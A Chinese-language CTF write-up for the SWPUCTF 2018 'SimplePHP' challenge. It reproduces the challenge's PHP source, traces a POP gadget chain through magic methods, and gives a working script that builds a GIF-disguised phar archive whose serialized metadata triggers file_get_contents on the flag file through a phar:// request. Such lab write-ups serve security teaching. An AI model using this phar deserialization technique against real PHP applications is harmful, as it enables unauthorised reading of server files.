# [SWPUCTF 2018]SimplePHP

### 知识点

- phar反序列化
- __construct()//当一个对象创建时被调用

__destruct() //当一个对象销毁时被调用

__toString() //当一个对象被当作一个字符串使用

__sleep()//在对象在被序列化之前运行

__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)

__get()//获得一个类的成员变量时调用

__set()//设置一个类的成员变量时调用

__invoke()//调用函数的方式调用一个对象时的回应方法

__call()//当调用一个对象中的不能用的方法的时候就会执行这个函数

### 题解



打开 查看文件，注意到"flie="可以通过此处查看php源码

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2770717/1625218288297-2ba55ffc-4f38-4285-b684-2dc9260cffdd.png?x-oss-process=image%2Fresize%2Cw_2000)

同时发现upload目录可以直接访问，这里可以直接知道文件名，或者后面源码里也有解释文件名如何加密，md5(文件名.ip)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2770717/1625219736562-3a74ae2f-fc94-4537-a288-35a0237c9de5.png)





**index.php**

```
<?php 
header("content-type:text/html;charset=utf-8");  
include 'base.php';
?>
```

**base.php**

```
<?php 
    session_start(); 
?> 
<!DOCTYPE html> 
<html> 
<head> 
    <meta charset="utf-8"> 
    <title>web3</title> 
    <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css"> 
    <script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"></script> 
    <script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script> 
</head> 
<body> 
    <nav class="navbar navbar-default" role="navigation"> 
        <div class="container-fluid"> 
        <div class="navbar-header"> 
            <a class="navbar-brand" href="index.php">首页</a> 
        </div> 
            <ul class="nav navbar-nav navbra-toggle"> 
                <li class="active"><a href="file.php?file=">查看文件</a></li> 
                <li><a href="upload_file.php">上传文件</a></li> 
            </ul> 
            <ul class="nav navbar-nav navbar-right"> 
                <li><a href="index.php"><span class="glyphicon glyphicon-user"></span><?php echo $_SERVER['REMOTE_ADDR'];?></a></li> 
            </ul> 
        </div> 
    </nav> 
</body> 
</html> 
<!--flag is in f1ag.php-->
```

**file.php**

```
<?php 
header("content-type:text/html;charset=utf-8");  
include 'function.php'; 
include 'class.php'; 
ini_set('open_basedir','/var/www/html/'); 
$file = $_GET["file"] ? $_GET['file'] : ""; 
if(empty($file)) { 
    echo "<h2>There is no file to show!<h2/>"; 
} 
$show = new Show(); 
if(file_exists($file)) { 
    $show->source = $file; 
    $show->_show(); 
} else if (!empty($file)){ 
    die('file doesn\'t exists.'); 
} 
?>
```

**upload_file.php**

```
<?php 
include 'function.php'; 
upload_file(); 
?> 
<html> 
<head> 
<meta charest="utf-8"> 
<title>文件上传</title> 
</head> 
<body> 
<div align = "center"> 
        <h1>前端写得很low,请各位师傅见谅!</h1> 
</div> 
<style> 
    p{ margin:0 auto} 
</style> 
<div> 
<form action="upload_file.php" method="post" enctype="multipart/form-data"> 
    <label for="file">文件名:</label> 
    <input type="file" name="file" id="file"><br> 
    <input type="submit" name="submit" value="提交"> 
</div> 
</script> 
</body> 
</html>
```

**function.php**

```
<?php 
//show_source(__FILE__); 
include "base.php"; 
header("Content-type: text/html;charset=utf-8"); 
error_reporting(0); 
function upload_file_do() { 
    global $_FILES; 
    $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg"; 
    //mkdir("upload",0777); 
    if(file_exists("upload/" . $filename)) { 
        unlink($filename); 
    } 
    move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename); 
    echo '<script type="text/javascript">alert("上传成功!");</script>'; 
} 
function upload_file() { 
    global $_FILES; 
    if(upload_file_check()) { 
        upload_file_do(); 
    } 
} 
function upload_file_check() { 
    global $_FILES; 
    $allowed_types = array("gif","jpeg","jpg","png"); 
    $temp = explode(".",$_FILES["file"]["name"]); 
    $extension = end($temp); 
    if(empty($extension)) { 
        //echo "<h4>请选择上传的文件:" . "<h4/>"; 
    } 
    else{ 
        if(in_array($extension,$allowed_types)) { 
            return true; 
        } 
        else { 
            echo '<script type="text/javascript">alert("Invalid file!");</script>'; 
            return false; 
        } 
    } 
} 
?>
```

**class.php**

```
<?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}
class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?>
```



从以上源码可以得到如下信息：

1.f1ag.php中但是“f1ag”被过滤了

2.上传的文件类型采用白名单

3.所有源代码均没有出现unserialize()，所以不能采用常规反序列化。同时有注释出现了phar，且phar协议没被过滤，所以这题是PHP反序列化中的phar反序列化。



**具体西路**

Show类中。自带文件读取功能。但是文件名不能带有flag。就算我们能通过phar反序列化后。还是绕不开这层正则匹配。这里就放弃了

![image](https://cdn.nlark.com/yuque/0/2021/png/2770717/1625219922489-362753de-3c78-4630-a72d-287a00de51db.png)

再看看其他类。发现Test类中。有一个魔法函数__get。当调用不存在的函数或属性时。就会自动调用__get函数。get函数又会调用__get。get又调用file_get读取文件。

大致流程就是：`不存在的函数->__get魔法函数->get函数->file_get函数读取`

那么我们就要找一个不存在的调用。

可以看到`$this->str['str']->source`。如果我将str['str']变成Test类。调用source函数。由于Test类没有source函数。就会触发魔法函数。调用__get。也就完成了上面的步骤

![image](https://cdn.nlark.com/yuque/0/2021/png/2770717/1625219922491-fed9e81a-ab79-4762-bd84-e05bbf1c8b38.png)

问题又来了。这个利用点再__toString魔法方法中。此魔术方法是输出时。比如echo什么的才会触发。还得继续找POP链

这不就找到了

![image](https://cdn.nlark.com/yuque/0/2021/png/2770717/1625219922406-d2183bac-cd0d-45b7-b233-af4e08764c11.png)

理一下思路。

```
通过Cle4r。将str赋值为Show类。
this->test=$this->Show类
echo $this->test;
触发Show类中的__tostring魔术方法。进入Show类。执行
$content=$this->str['str']->source;
那么我们将str['str']赋值为Test类。使其调用source。但是不存在。
接下来就进入了Test类。执行
__get($key)。这个$key。其实就是source。
get($key)
$value=this->params['source'];
file_get_contents($value);
由于Test类在构造函数中。定义了params是个数组。那么我们就定义params=array('source'=>'/var/www/html/fl1g.php');
```





```
<?php
class C1e4r{
    public $test;
    public $str;
}
class Show{
    public $source;
    public $str;
}
class Test{
    public $file;
    public $params; 
}
$c=new Test();
$c->params=array('source'=>'var/www/html/f1ag.php');
$b=new Show();
$b->str['str']=$c;
$a=new C1e4r();
$a->str=$b;
echo serialize($a);
@unlink("phar.phar");
$phar=new Phar("phar.phar");
$phar->startBuffering(); 
$phar->setStub('GIF89a'."<?php __HALT_COMPILER(); ?>"); 
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```



最后将phar.phar改为gif等后缀，上传，通过file访问phar即可，注意要用上传后的文件名





```
/file.php?file=phar://upload/154c25aad5ed08851eac82ebff2cb800.jpg
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2770717/1625220189367-aae2f795-8db7-487f-ad1d-90cdcc394bf6.png)

base64解码即可



https://www.cnblogs.com/zzjdbk/p/13030571.html

https://www.cnblogs.com/kuaile1314/p/13493277.html